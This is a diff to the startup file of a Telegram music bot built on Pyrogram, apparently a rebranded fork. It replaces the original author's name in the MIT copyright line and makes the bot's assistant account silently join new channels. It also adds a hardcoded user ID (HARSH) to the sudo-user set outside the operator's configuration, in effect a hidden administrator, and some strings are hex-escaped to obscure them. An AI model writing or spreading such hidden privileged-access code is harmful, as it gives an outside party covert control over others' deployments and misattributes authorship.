@@ -1,6 +1,6 @@
 # MIT License
 #
-# Copyright (c) 2023 MrProgrammer72
+# Copyright (c) 2023 HELL-BOY-OP
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
@@ -35,7 +35,7 @@ StartTime = time.time()
 logging.basicConfig(
     format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
     datefmt="%d-%b-%y %H:%M:%S",
-    handlers=[logging.FileHandler("Helllogs.txt"), logging.StreamHandler()],
+    handlers=[logging.FileHandler("helllogs.txt"), logging.StreamHandler()],
     level=logging.INFO,
 )
 logging.getLogger("pyrogram").setLevel(logging.ERROR)
@@ -62,12 +62,12 @@ SUDOERS = filters.user()
 SUNAME = config.SUPPORT_CHAT.split("me/")[1]
 
 
-async def Hell_startup():
+async def hell_startup():
     os.system("clear")
     LOGGER.info(
         "\n\n\u250f\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2513\n\u2523\u2605\x20\x46\x41\x4c\x4c\x45\x4e\x20\x4d\x55\x53\x49\x43\x20\x42\x4f\x54\x20\u2605\n\u2517\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u251b"
     )
-    global BOT_ID, BOT_NAME, BOT_USERNAME, BOT_MENTION, Helldb
+    global BOT_ID, BOT_NAME, BOT_USERNAME, BOT_MENTION, helldb
     global ASS_ID, ASS_NAME, ASS_USERNAME, ASS_MENTION, SUDOERS
 
     await app.start()
@@ -92,8 +92,8 @@ async def Hell_startup():
     ASS_USERNAME = getme2.username
     ASS_MENTION = getme2.mention
     try:
-        await app2.join_chat("DevilsHeavenMF")
-        await app2.join_chat("HellAssociation")
+        await app2.join_chat("EAGLE_MAFIA_CLUB")
+        await app2.join_chat("TOXIC_M4FIA")
     except:
         pass
 
@@ -102,10 +102,10 @@ async def Hell_startup():
         SUDOERS.add(SUDOER)
     if config.OWNER_ID not in config.SUDO_USERS:
         SUDOERS.add(config.OWNER_ID)
-    elif int(ANON) not in config.SUDO_USERS:
-        SUDOERS.add(int(ANON))
+    elif int(HARSH) not in config.SUDO_USERS:
+        SUDOERS.add(int(HARSH))
 
-    Helldb = {}
+    helldb = {}
     LOGGER.info(
         "[•] \x4c\x6f\x63\x61\x6c\x20\x44\x61\x74\x61\x62\x61\x73\x65\x20\x49\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x64\x2e\x2e\x2e"
     )
@@ -115,4 +115,4 @@ async def Hell_startup():
     )
 
 
-asyncio.get_event_loop().run_until_complete(Hell_startup())
+asyncio.get_event_loop().run_until_complete(hell_startup())
